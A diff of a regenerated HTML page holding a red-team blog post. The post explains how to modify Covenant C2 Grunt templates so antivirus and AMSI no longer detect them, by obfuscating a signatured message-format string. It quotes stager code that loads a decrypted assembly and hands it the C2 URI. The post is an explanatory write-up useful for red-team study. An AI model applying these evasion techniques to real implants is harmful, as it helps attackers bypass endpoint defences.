@@ -3,7 +3,7 @@
   <head>
     <title>Using Custom Covenant Listener Profiles &amp; Grunt Templates to Elude AV - Offensive Defence</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
@@ -18,8 +18,8 @@
 <meta property="og:description" content="Whenever we download an offensive tool from the Internet, it comes as no surprise when it gets snapped up by an anti-virus solution. AV vendors are certainly keeping a keen eye on tools posted publicly (insert conspiracy theory about Microsoft owning GitHub) and are reacting relatively quickly to push signatures for those tools. However, it&rsquo;s probably fair to say that these signatures are not particularly robust, and only really serve to catch those that don&rsquo;t have the skills or knowledge to make the necesary modifications." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://offensivedefence.co.uk/posts/covenant-profiles-templates/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2020-11-07T11:54:14&#43;00:00" />
-<meta property="article:modified_time" content="2020-11-07T11:54:14&#43;00:00" />
+<meta property="article:published_time" content="2020-11-07T11:54:14+00:00" />
+<meta property="article:modified_time" content="2020-11-07T11:54:14+00:00" />
 
 
 
@@ -86,7 +86,7 @@
 <p>This detection comes from the StagerCode in the Grunt template, rather than the traffic profile.</p>
 <p><img src="/images/covenant-profiles-templates/stagercode-message-format.png" alt="messageformat" title="StagerCode Message Format"></p>
 <p>On the assumption that this is a simple string detection, we can try and circumvent it using concatenation or other string-manipulations.  I replaced line 43 with <code>string MessageFormat = GetMessageFormat;</code> and inserted a new method for retrieving the string via a string builder.</p>
-<pre><code>public static string GetMessageFormat
+<pre tabindex="0"><code>public static string GetMessageFormat
 {
     get
     {
@@ -100,18 +100,18 @@
     }
 }
 </code></pre><p>Regenerate the stager and this time we have no detections from ThreatCheck.</p>
-<pre><code>ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntHTTP.exe
+<pre tabindex="0"><code>ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntHTTP.exe
 [+] No threat found!
 [*] Run time: 0.23s
 </code></pre><p>With a feeling of elation we run the Stager, but it seems to break at Stage2. So what&rsquo;s going on here?</p>
 <p><img src="/images/covenant-profiles-templates/stage2-grunt.png" alt="stage2" title="Stage2 Grunt"></p>
 <p>Well, this machine has .NET Framework 4.8 installed so AMSI is scanning content being passed into <code>Assembly.Load()</code>. This is the penultimate instruction the Stager performs before passing control to the full Grunt stage.</p>
-<pre><code>Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
+<pre tabindex="0"><code>Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
 gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
 </code></pre><p>So something in that final stage is being flagged by AMSI and is being prevented from loading.  It turns out that the ExecutorCode in the Grunt template has the same message format string that we changed in the StagerCode.</p>
 <p><img src="/images/covenant-profiles-templates/executorcode-message-format.png" alt="executor" title="Executor Message Format"></p>
 <p>I swapped this for the same getter as in the Stager:</p>
-<pre><code>private static string GruntEncryptedMessageFormat
+<pre tabindex="0"><code>private static string GruntEncryptedMessageFormat
 {
     get
     {
